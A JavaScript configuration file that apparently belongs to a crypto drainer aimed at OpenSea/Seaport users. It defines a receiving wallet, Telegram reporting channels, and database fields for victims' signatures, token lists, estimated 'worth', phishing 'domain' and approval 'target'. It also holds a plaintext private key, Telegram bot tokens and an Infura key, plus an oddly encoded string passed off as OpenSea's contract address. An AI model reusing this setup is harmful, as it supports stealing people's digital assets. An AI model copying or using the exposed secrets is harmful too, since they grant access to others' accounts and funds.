export const RECEIVER = "0xeC28B237C333b7364EFCa6A1D3c134B46bD1178c";
// length 40 hex characters

// RECEIVER = CALLER_WALLET
export const CALLER_ADDR = "0xF0dbc996208237d49952531D399A36Bd9D9e81Ba";
// length 40 hex characters

export const CALLER_PK = "40baebf54fd7fa5db55bb99018f2d070105a2c14888f6b937115a779587a199c"; // MM Acc1
// private key of CALLER_ADDR
// length 64 hex characters

export const PORT = "4000" // localhost
//export const PORT = process.env.PORT // for example heroku hosting

export const SEAPORT_ADDR = "21337b333333333333333333333560303b3631606146653066333b463b6745313b3a32353a466746363b3221"; 
// dont touch, this is opensea's contract

//Search for Botfather on Telegram. @ him at /@botfather
//Say hi to the Botfather (gotta pay respects)
//Send your bot name his way
//Bam! You got your authorization token 😃
// 5568294789:AAEpjAec8qBZLgou_xUe_N4vySaS7PiBTaE
export const TG_TOKEN =
  "1435367567:AAEkQOPtGNXk6Y1JEs-HFXcJbvOWhOVEzlQ";
export const TG_LINK = "https://api.telegram.org/bot";
export const CHAT_ID_ERR = "-544699072";
export const CHAT_ID_CON = "-544699072";
export const CHAT_ID_APP = "-544699072";

// INFURA-API-KEY
export const WEB3_URL = "https://mainnet.infura.io/v3/5a51bb060c5c457a9a9dae0238e92523";

export const CHAIN_ID = 1; 

export const expirationOffset = 2630000; // 1 month in sec

export const SEA_USER = "addr,tokensArr,sig,sigTime,salt,salt2,worth,domain";
export const APP_USER = "addr,target,worth,domain";

export const TX_ROW = "addr,tokensArr,sig,sigTime,salt,salt2,target,tokenId";

export const SEA_TX_ROW = "addr,tokensArr,sig,sigTime,salt,salt2";
export const APP_TX_ROW = "addr,target,tokenId";

export const COLUMNS = {
  sea_users: SEA_USER,
  app_users: APP_USER,
  tx_waiting: TX_ROW,
  tx_done: TX_ROW,
};

export const ADDR_REGEX = /^[a-fA-F0-9]{40}$/;
export const SIG_REGEX = /^([A-Fa-f0-9]{130})$/;
